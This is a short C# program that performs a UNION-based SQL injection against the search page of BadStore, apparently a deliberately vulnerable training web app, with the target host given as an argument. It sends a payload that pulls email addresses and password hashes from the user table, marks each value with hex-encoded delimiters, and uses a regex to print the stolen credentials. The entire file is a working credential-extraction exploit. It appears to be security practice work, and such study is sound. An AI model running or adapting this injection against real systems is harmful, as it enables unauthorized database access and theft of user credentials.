using System;
using System.Linq;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.IO;
using System.Threading.Tasks;

namespace sqlInject
{
    class Program
    {
        static async Task Main(string[] args)
        {
            string frontMarker = "Fr0nTM@rk3r";
            string middleMarker = "M1ddl3M@rk3r";
            string endMarker = "3ndM@rk3r";
            string frontHex = string.Join("", frontMarker.Select(c => ((int)c).ToString("X2")));
            string middleHex = string.Join("", middleMarker.Select(c => ((int)c).ToString("X2")));
            string endHex = string.Join("", endMarker.Select(c => ((int)c).ToString("X2")));

            string url = "http://" + args[0] + "/cgi-bin/badstore.cgi";

            string payload = "f' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x"+frontHex+", IFNULL(CAST(email AS CHAR),0x20),0x"+middleHex+", IFNULL(CAST(passwd AS CHAR),0x20),0x"+endHex+") FROM badstoredb.userdb# ";

            url += "?searchquery=" + Uri.EscapeUriString(payload) + "&action=search";

            System.Console.WriteLine(url);

            HttpClient client = new HttpClient();

            string response = await client.GetStringAsync(url);
            // using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream())) {
            //     response = reader.ReadToEnd();
            // }

            System.Console.WriteLine(response);

            Regex payloadRegex = new Regex(frontMarker + "(.*?)" + middleMarker + "(.*?)" + endMarker);
            MatchCollection matches = payloadRegex.Matches(response);
            foreach (Match match in matches) {
                System.Console.WriteLine("Username: " + match.Groups[1].Value + "\t");
                System.Console.Write("Password hash: " + match.Groups[2].Value);
            }
        }
    }
}

